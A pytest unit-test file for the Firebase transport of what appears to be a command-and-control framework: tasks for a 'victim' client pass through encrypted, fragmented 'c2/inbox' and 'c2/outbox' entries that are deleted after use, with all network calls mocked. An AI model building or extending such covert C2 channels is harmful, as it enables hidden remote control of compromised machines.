"""Unit tests for the Firebase channel implementation.

Covers: _entry_key, URL helpers, channel properties, _read/_write/_delete,
read_inbox/read_outbox, write_task/write_result, delete_task/delete_result,
fragment builders, get_channel() factory, delete_task_entry() wrapper.

All HTTP calls are mocked — no real Firebase connection required.
"""

import pytest
from unittest.mock import patch, MagicMock
from cryptography.fernet import Fernet


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

FIREBASE_ENV = {
    "CHANNEL":               "firebase",
    "FIREBASE_URL":          "https://test-project-default-rtdb.firebaseio.com",
    "FIREBASE_INBOX_PATH":   "c2/inbox",
    "FIREBASE_OUTBOX_PATH":  "c2/outbox",
    "ENCRYPTION_METHOD":     "plaintext",
    "FRAGMENT_METHOD":       "passthrough",
}


@pytest.fixture
def firebase_env(monkeypatch):
    """Set Firebase env vars and reset the active channel for each test."""
    for k, v in FIREBASE_ENV.items():
        monkeypatch.setenv(k, v)
    import common
    common._active_channel = None
    yield
    common._active_channel = None


def ok_response(json_data=None):
    m = MagicMock()
    m.ok = True
    m.json.return_value = json_data
    m.raise_for_status = MagicMock()
    return m


def error_response(status_code=500):
    m = MagicMock()
    m.ok = False
    m.status_code = status_code
    m.raise_for_status.side_effect = Exception(f"HTTP {status_code}")
    return m


# ---------------------------------------------------------------------------
# _entry_key
# ---------------------------------------------------------------------------

class TestEntryKey:
    def test_normal_row_uses_command_id(self):
        from channel.firebase import _entry_key
        assert _entry_key({"command_id": "abc123", "status": "pending"}) == "abc123"

    def test_success_status_uses_command_id(self):
        from channel.firebase import _entry_key
        assert _entry_key({"command_id": "abc123", "status": "success"}) == "abc123"

    def test_fragment_index_0(self):
        from channel.firebase import _entry_key
        assert _entry_key({"command_id": "abc123", "status": "frag:0:3"}) == "abc123_f0"

    def test_fragment_index_mid(self):
        from channel.firebase import _entry_key
        assert _entry_key({"command_id": "abc123", "status": "frag:2:3"}) == "abc123_f2"

    def test_missing_status_uses_command_id(self):
        from channel.firebase import _entry_key
        assert _entry_key({"command_id": "abc123"}) == "abc123"

    def test_frag_without_total_still_extracts_index(self):
        from channel.firebase import _entry_key
        # "frag:0" has no total count but index 0 is still extractable
        assert _entry_key({"command_id": "abc123", "status": "frag:0"}) == "abc123_f0"

    def test_malformed_frag_non_numeric_index_falls_back(self):
        from channel.firebase import _entry_key
        assert _entry_key({"command_id": "abc123", "status": "frag:notint:3"}) == "abc123"


# ---------------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------------

class TestUrlHelpers:
    def test_inbox_url_default_path(self, firebase_env):
        from channel.firebase import FirebaseChannel
        ch = FirebaseChannel()
        assert ch._inbox_url() == (
            "https://test-project-default-rtdb.firebaseio.com/c2/inbox.json"
        )

    def test_outbox_url_default_path(self, firebase_env):
        from channel.firebase import FirebaseChannel
        ch = FirebaseChannel()
        assert ch._outbox_url() == (
            "https://test-project-default-rtdb.firebaseio.com/c2/outbox.json"
        )

    def test_inbox_url_with_entry_suffix(self, firebase_env):
        from channel.firebase import FirebaseChannel
        ch = FirebaseChannel()
        assert ch._inbox_url("/abc123") == (
            "https://test-project-default-rtdb.firebaseio.com/c2/inbox/abc123.json"
        )

    def test_trailing_slash_in_base_url_stripped(self, monkeypatch):
        monkeypatch.setenv("FIREBASE_URL", "https://test-default-rtdb.firebaseio.com/")
        monkeypatch.setenv("FIREBASE_INBOX_PATH", "c2/inbox")
        monkeypatch.setenv("FIREBASE_OUTBOX_PATH", "c2/outbox")
        from channel.firebase import FirebaseChannel
        url = FirebaseChannel()._inbox_url()
        assert not url.startswith("https://test-default-rtdb.firebaseio.com//")
        assert url.endswith(".json")

    def test_custom_inbox_path(self, monkeypatch):
        monkeypatch.setenv("FIREBASE_URL", "https://x-default-rtdb.firebaseio.com")
        monkeypatch.setenv("FIREBASE_INBOX_PATH", "ops/tasks")
        monkeypatch.setenv("FIREBASE_OUTBOX_PATH", "ops/results")
        from channel.firebase import FirebaseChannel
        ch = FirebaseChannel()
        assert ch._inbox_url() == "https://x-default-rtdb.firebaseio.com/ops/tasks.json"
        assert ch._outbox_url() == "https://x-default-rtdb.firebaseio.com/ops/results.json"

    def test_leading_slash_in_path_stripped(self, monkeypatch):
        monkeypatch.setenv("FIREBASE_URL", "https://x-default-rtdb.firebaseio.com")
        monkeypatch.setenv("FIREBASE_INBOX_PATH", "/c2/inbox/")
        monkeypatch.setenv("FIREBASE_OUTBOX_PATH", "/c2/outbox/")
        from channel.firebase import FirebaseChannel
        ch = FirebaseChannel()
        url = ch._inbox_url()
        assert "//c2" not in url
        assert url.endswith(".json")


# ---------------------------------------------------------------------------
# Channel properties
# ---------------------------------------------------------------------------

class TestChannelProperties:
    def test_refresh_interval_is_three(self, firebase_env):
        from channel.firebase import FirebaseChannel
        assert FirebaseChannel().refresh_interval() == 3.0

    def test_supports_cleanup_is_true(self, firebase_env):
        from channel.firebase import FirebaseChannel
        assert FirebaseChannel().supports_cleanup is True

    def test_sheets_supports_cleanup_is_false(self):
        from channel.sheets import SheetsChannel
        assert SheetsChannel().supports_cleanup is False


# ---------------------------------------------------------------------------
# _read
# ---------------------------------------------------------------------------

class TestRead:
    def test_returns_decrypted_rows(self, firebase_env):
        from channel.firebase import FirebaseChannel
        data = {"k1": {"command_id": "abc", "command": "shell", "status": "pending"}}
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel()._read("https://x.firebaseio.com/path.json")
        assert len(rows) == 1
        assert rows[0]["command_id"] == "abc"

    def test_multiple_entries_all_returned(self, firebase_env):
        from channel.firebase import FirebaseChannel
        data = {
            "k1": {"command_id": "a1", "status": "pending"},
            "k2": {"command_id": "a2", "status": "pending"},
        }
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel()._read("https://x.firebaseio.com/path.json")
        assert len(rows) == 2

    def test_null_firebase_response_returns_empty(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.get", return_value=ok_response(None)):
            rows = FirebaseChannel()._read("https://x.firebaseio.com/path.json")
        assert rows == []

    def test_non_dict_entries_are_skipped(self, firebase_env):
        from channel.firebase import FirebaseChannel
        data = {
            "k1": {"command_id": "abc"},
            "k2": "a bare string — not a dict",
            "k3": 42,
        }
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel()._read("https://x.firebaseio.com/path.json")
        assert len(rows) == 1
        assert rows[0]["command_id"] == "abc"

    def test_network_error_returns_empty_list(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.get", side_effect=Exception("connection timeout")):
            rows = FirebaseChannel()._read("https://x.firebaseio.com/path.json")
        assert rows == []

    def test_fernet_values_decrypted(self, monkeypatch):
        key = Fernet.generate_key().decode()
        monkeypatch.setenv("CHANNEL", "firebase")
        monkeypatch.setenv("FIREBASE_URL", "https://test-default-rtdb.firebaseio.com")
        monkeypatch.setenv("FIREBASE_INBOX_PATH", "c2/inbox")
        monkeypatch.setenv("FIREBASE_OUTBOX_PATH", "c2/outbox")
        monkeypatch.setenv("ENCRYPTION_METHOD", "fernet")
        monkeypatch.setenv("ENCRYPTION_KEY", key)
        import common; common._active_channel = None

        from crypto.fernet import FernetEncryptor
        from common import _encrypt_row
        enc = FernetEncryptor()
        encrypted = _encrypt_row({"command_id": "abc", "command": "shell"}, enc)
        data = {"k1": encrypted}

        from channel.firebase import FirebaseChannel
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel()._read("https://test-default-rtdb.firebaseio.com/c2/inbox.json")
        assert rows[0]["command_id"] == "abc"
        assert rows[0]["command"] == "shell"
        common._active_channel = None


# ---------------------------------------------------------------------------
# _write
# ---------------------------------------------------------------------------

class TestWrite:
    def test_returns_true_on_http_ok(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.put", return_value=ok_response()):
            assert FirebaseChannel()._write("https://x.json", {"command_id": "abc"}) is True

    def test_returns_false_on_http_error(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.put", return_value=error_response()):
            assert FirebaseChannel()._write("https://x.json", {"command_id": "abc"}) is False

    def test_returns_false_on_network_exception(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.put", side_effect=Exception("network error")):
            assert FirebaseChannel()._write("https://x.json", {"command_id": "abc"}) is False

    def test_body_sent_as_json(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.put", return_value=ok_response()) as mock_put:
            FirebaseChannel()._write("https://x.json", {"command_id": "abc", "command": "shell"})
        _, kwargs = mock_put.call_args
        assert "json" in kwargs
        assert kwargs["json"]["command_id"] == "abc"

    def test_fernet_values_encrypted_before_send(self, monkeypatch):
        key = Fernet.generate_key().decode()
        monkeypatch.setenv("CHANNEL", "firebase")
        monkeypatch.setenv("FIREBASE_URL", "https://test-default-rtdb.firebaseio.com")
        monkeypatch.setenv("FIREBASE_INBOX_PATH", "c2/inbox")
        monkeypatch.setenv("FIREBASE_OUTBOX_PATH", "c2/outbox")
        monkeypatch.setenv("ENCRYPTION_METHOD", "fernet")
        monkeypatch.setenv("ENCRYPTION_KEY", key)
        import common; common._active_channel = None

        sent = {}
        def capture(url, json=None, **kwargs):
            sent.update(json or {})
            return ok_response()

        from channel.firebase import FirebaseChannel
        with patch("requests.put", side_effect=capture):
            FirebaseChannel()._write("https://x.json", {"command_id": "abc", "command": "shell"})

        assert sent.get("command_id") != "abc"
        assert sent.get("command") != "shell"
        common._active_channel = None


# ---------------------------------------------------------------------------
# _delete
# ---------------------------------------------------------------------------

class TestDelete:
    def test_returns_true_on_ok(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", return_value=ok_response()):
            assert FirebaseChannel()._delete("https://x.json") is True

    def test_returns_false_on_http_error(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", return_value=error_response(403)):
            assert FirebaseChannel()._delete("https://x.json") is False

    def test_returns_false_on_exception(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", side_effect=Exception("timeout")):
            assert FirebaseChannel()._delete("https://x.json") is False


# ---------------------------------------------------------------------------
# read_inbox
# ---------------------------------------------------------------------------

class TestReadInbox:
    def test_normal_row_returned(self, firebase_env):
        from channel.firebase import FirebaseChannel
        data = {"abc": {"command_id": "abc", "command": "shell", "payload": "{}",
                        "target": "", "status": "pending", "created_at": "t"}}
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel().read_inbox()
        assert len(rows) == 1
        assert rows[0]["command_id"] == "abc"
        assert rows[0]["status"] == "pending"

    def test_empty_db_returns_empty(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.get", return_value=ok_response(None)):
            assert FirebaseChannel().read_inbox() == []

    def test_fragment_rows_reassembled(self, firebase_env):
        from channel.firebase import FirebaseChannel
        data = {
            "abc_f0": {"command_id": "abc", "command": "shell", "payload": "hello ",
                       "target": "", "status": "frag:0:2", "created_at": "t"},
            "abc_f1": {"command_id": "abc", "command": "shell", "payload": "world",
                       "target": "", "status": "frag:1:2", "created_at": "t"},
        }
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel().read_inbox()
        assert len(rows) == 1
        assert rows[0]["payload"] == "hello world"
        assert rows[0]["status"] == "pending"

    def test_incomplete_fragments_dropped(self, firebase_env):
        from channel.firebase import FirebaseChannel
        # Only one of two fragments present
        data = {
            "abc_f0": {"command_id": "abc", "command": "shell", "payload": "hello ",
                       "target": "", "status": "frag:0:2", "created_at": "t"},
        }
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel().read_inbox()
        assert rows == []

    def test_reads_from_inbox_path(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.get", return_value=ok_response(None)) as mock_get:
            FirebaseChannel().read_inbox()
        url = mock_get.call_args[0][0]
        assert "c2/inbox" in url


# ---------------------------------------------------------------------------
# read_outbox
# ---------------------------------------------------------------------------

class TestReadOutbox:
    def test_normal_result_returned(self, firebase_env):
        from channel.firebase import FirebaseChannel
        data = {"abc": {"command_id": "abc", "client_id": "victim",
                        "status": "success", "result": "root", "timestamp": "t"}}
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel().read_outbox()
        assert len(rows) == 1
        assert rows[0]["result"] == "root"

    def test_out_of_order_fragments_reassembled(self, firebase_env):
        from channel.firebase import FirebaseChannel
        data = {
            "abc_f1": {"command_id": "abc", "client_id": "w1", "status": "frag:1:2",
                       "result": "world", "timestamp": "t"},
            "abc_f0": {"command_id": "abc", "client_id": "w1", "status": "frag:0:2",
                       "result": "hello ", "timestamp": "t"},
        }
        with patch("requests.get", return_value=ok_response(data)):
            rows = FirebaseChannel().read_outbox()
        assert len(rows) == 1
        assert rows[0]["result"] == "hello world"

    def test_reads_from_outbox_path(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.get", return_value=ok_response(None)) as mock_get:
            FirebaseChannel().read_outbox()
        url = mock_get.call_args[0][0]
        assert "c2/outbox" in url


# ---------------------------------------------------------------------------
# write_task
# ---------------------------------------------------------------------------

class TestWriteTask:
    def test_puts_to_inbox_url_keyed_by_command_id(self, firebase_env):
        from channel.firebase import FirebaseChannel
        task = {"command_id": "abc123", "command": "shell", "payload": "{}",
                "target": "", "status": "pending", "created_at": "t"}
        with patch("requests.put", return_value=ok_response()) as mock_put:
            FirebaseChannel().write_task(task)
        url = mock_put.call_args[0][0]
        assert "c2/inbox/abc123.json" in url

    def test_fragment_keyed_with_fN_suffix(self, firebase_env):
        from channel.firebase import FirebaseChannel
        task = {"command_id": "abc123", "command": "shell", "payload": "chunk",
                "target": "", "status": "frag:1:3", "created_at": "t"}
        with patch("requests.put", return_value=ok_response()) as mock_put:
            FirebaseChannel().write_task(task)
        url = mock_put.call_args[0][0]
        assert "c2/inbox/abc123_f1.json" in url

    def test_returns_true_on_success(self, firebase_env):
        from channel.firebase import FirebaseChannel
        task = {"command_id": "x", "command": "echo", "payload": "{}",
                "target": "", "status": "pending", "created_at": "t"}
        with patch("requests.put", return_value=ok_response()):
            assert FirebaseChannel().write_task(task) is True

    def test_returns_false_on_failure(self, firebase_env):
        from channel.firebase import FirebaseChannel
        task = {"command_id": "x", "command": "echo", "payload": "{}",
                "target": "", "status": "pending", "created_at": "t"}
        with patch("requests.put", return_value=error_response()):
            assert FirebaseChannel().write_task(task) is False


# ---------------------------------------------------------------------------
# write_result
# ---------------------------------------------------------------------------

class TestWriteResult:
    def test_puts_to_outbox_url_keyed_by_command_id(self, firebase_env):
        from channel.firebase import FirebaseChannel
        result = {"command_id": "abc123", "client_id": "victim",
                  "status": "success", "result": "ok", "timestamp": "t"}
        with patch("requests.put", return_value=ok_response()) as mock_put:
            FirebaseChannel().write_result(result)
        url = mock_put.call_args[0][0]
        assert "c2/outbox/abc123.json" in url

    def test_returns_true_on_success(self, firebase_env):
        from channel.firebase import FirebaseChannel
        result = {"command_id": "x", "client_id": "v", "status": "success",
                  "result": "ok", "timestamp": "t"}
        with patch("requests.put", return_value=ok_response()):
            assert FirebaseChannel().write_result(result) is True


# ---------------------------------------------------------------------------
# delete_task / delete_result
# ---------------------------------------------------------------------------

class TestDeleteTask:
    def test_sends_delete_to_inbox_entry_url(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", return_value=ok_response()) as mock_del:
            FirebaseChannel().delete_task("abc123")
        url = mock_del.call_args[0][0]
        assert "c2/inbox/abc123.json" in url

    def test_returns_true_on_success(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", return_value=ok_response()):
            assert FirebaseChannel().delete_task("abc123") is True

    def test_returns_false_on_error(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", return_value=error_response()):
            assert FirebaseChannel().delete_task("abc123") is False


class TestDeleteResult:
    def test_sends_delete_to_outbox_entry_url(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", return_value=ok_response()) as mock_del:
            FirebaseChannel().delete_result("abc123")
        url = mock_del.call_args[0][0]
        assert "c2/outbox/abc123.json" in url

    def test_returns_true_on_success(self, firebase_env):
        from channel.firebase import FirebaseChannel
        with patch("requests.delete", return_value=ok_response()):
            assert FirebaseChannel().delete_result("abc123") is True


# ---------------------------------------------------------------------------
# Fragment builders
# ---------------------------------------------------------------------------

class TestBuildOutboxFragments:
    def test_correct_count(self, firebase_env):
        from channel.firebase import FirebaseChannel
        frags = FirebaseChannel().build_outbox_fragments(
            {"command_id": "abc", "client_id": "w1", "timestamp": "t"},
            ["a", "b", "c"],
        )
        assert len(frags) == 3

    def test_status_frag_format(self, firebase_env):
        from channel.firebase import FirebaseChannel
        frags = FirebaseChannel().build_outbox_fragments(
            {"command_id": "abc", "client_id": "w1", "timestamp": "t"},
            ["p1", "p2"],
        )
        assert frags[0]["status"] == "frag:0:2"
        assert frags[1]["status"] == "frag:1:2"

    def test_result_field_contains_chunk(self, firebase_env):
        from channel.firebase import FirebaseChannel
        frags = FirebaseChannel().build_outbox_fragments(
            {"command_id": "abc", "client_id": "w1", "timestamp": "t"},
            ["chunk_a", "chunk_b"],
        )
        assert frags[0]["result"] == "chunk_a"
        assert frags[1]["result"] == "chunk_b"

    def test_command_id_propagated(self, firebase_env):
        from channel.firebase import FirebaseChannel
        frags = FirebaseChannel().build_outbox_fragments(
            {"command_id": "abc123", "client_id": "w1", "timestamp": "t"},
            ["x"],
        )
        assert frags[0]["command_id"] == "abc123"

    def test_fragment_keys_are_unique(self, firebase_env):
        """_entry_key on each fragment must produce distinct keys."""
        from channel.firebase import FirebaseChannel, _entry_key
        frags = FirebaseChannel().build_outbox_fragments(
            {"command_id": "abc", "client_id": "w1", "timestamp": "t"},
            ["a", "b", "c"],
        )
        keys = [_entry_key(f) for f in frags]
        assert len(set(keys)) == 3


class TestBuildInboxFragments:
    def test_correct_count(self, firebase_env):
        from channel.firebase import FirebaseChannel
        frags = FirebaseChannel().build_inbox_fragments(
            {"command_id": "abc", "command": "shell", "target": "", "created_at": "t"},
            ["c1", "c2"],
        )
        assert len(frags) == 2

    def test_payload_field_contains_chunk(self, firebase_env):
        from channel.firebase import FirebaseChannel
        frags = FirebaseChannel().build_inbox_fragments(
            {"command_id": "abc", "command": "shell", "target": "", "created_at": "t"},
            ["chunk1", "chunk2"],
        )
        assert frags[0]["payload"] == "chunk1"
        assert frags[1]["payload"] == "chunk2"

    def test_status_frag_format(self, firebase_env):
        from channel.firebase import FirebaseChannel
        frags = FirebaseChannel().build_inbox_fragments(
            {"command_id": "abc", "command": "shell", "target": "", "created_at": "t"},
            ["x", "y", "z"],
        )
        assert frags[2]["status"] == "frag:2:3"


# ---------------------------------------------------------------------------
# get_channel() factory
# ---------------------------------------------------------------------------

class TestGetChannelFactory:
    def test_channel_firebase_returns_firebase_channel(self, firebase_env):
        import common
        common._active_channel = None
        from channel.firebase import FirebaseChannel
        assert isinstance(common.get_channel(), FirebaseChannel)

    def test_channel_sheets_returns_sheets_channel(self, monkeypatch):
        monkeypatch.setenv("CHANNEL", "sheets")
        import common
        common._active_channel = None
        from channel.sheets import SheetsChannel
        assert isinstance(common.get_channel(), SheetsChannel)
        common._active_channel = None

    def test_channel_unset_defaults_to_sheets(self, monkeypatch):
        monkeypatch.delenv("CHANNEL", raising=False)
        import common
        common._active_channel = None
        from channel.sheets import SheetsChannel
        assert isinstance(common.get_channel(), SheetsChannel)
        common._active_channel = None

    def test_active_channel_cached_after_first_call(self, firebase_env):
        import common
        common._active_channel = None
        ch1 = common.get_channel()
        ch2 = common.get_channel()
        assert ch1 is ch2


# ---------------------------------------------------------------------------
# delete_task_entry() wrapper
# ---------------------------------------------------------------------------

class TestDeleteTaskEntryWrapper:
    def test_calls_delete_on_firebase_channel(self, firebase_env):
        import common
        common._active_channel = None
        with patch("requests.delete", return_value=ok_response()) as mock_del:
            common.delete_task_entry("abc123")
        urls = [call[0][0] for call in mock_del.call_args_list]
        assert any("inbox" in u for u in urls), "expected inbox DELETE"
        assert any("outbox" in u for u in urls), "expected outbox DELETE"

    def test_calls_both_delete_task_and_delete_result(self, firebase_env):
        import common
        common._active_channel = None
        with patch("requests.delete", return_value=ok_response()) as mock_del:
            common.delete_task_entry("abc123")
        assert mock_del.call_count == 2

    def test_noop_on_sheets_channel(self, monkeypatch):
        monkeypatch.setenv("CHANNEL", "sheets")
        import common
        common._active_channel = None
        with patch("requests.delete") as mock_del:
            common.delete_task_entry("abc123")
        mock_del.assert_not_called()
        common._active_channel = None

    def test_returns_none_regardless_of_channel(self, firebase_env):
        import common
        common._active_channel = None
        with patch("requests.delete", return_value=ok_response()):
            result = common.delete_task_entry("abc123")
        assert result is None


# ---------------------------------------------------------------------------
# delete_outbox_entry() wrapper
# ---------------------------------------------------------------------------

class TestDeleteOutboxEntryWrapper:
    def test_calls_delete_result_on_firebase_channel(self, firebase_env):
        import common
        common._active_channel = None
        with patch("requests.delete", return_value=ok_response()) as mock_del:
            common.delete_outbox_entry("hb123")
        urls = [call[0][0] for call in mock_del.call_args_list]
        assert len(urls) == 1, "only outbox should be deleted"
        assert "outbox" in urls[0]
        assert "hb123" in urls[0]

    def test_does_not_delete_inbox(self, firebase_env):
        import common
        common._active_channel = None
        with patch("requests.delete", return_value=ok_response()) as mock_del:
            common.delete_outbox_entry("hb123")
        urls = [call[0][0] for call in mock_del.call_args_list]
        assert not any("inbox" in u for u in urls)

    def test_noop_on_sheets_channel(self, monkeypatch):
        monkeypatch.setenv("CHANNEL", "sheets")
        import common
        common._active_channel = None
        with patch("requests.delete") as mock_del:
            common.delete_outbox_entry("hb123")
        mock_del.assert_not_called()
        common._active_channel = None

    def test_returns_none(self, firebase_env):
        import common
        common._active_channel = None
        with patch("requests.delete", return_value=ok_response()):
            result = common.delete_outbox_entry("hb123")
        assert result is None
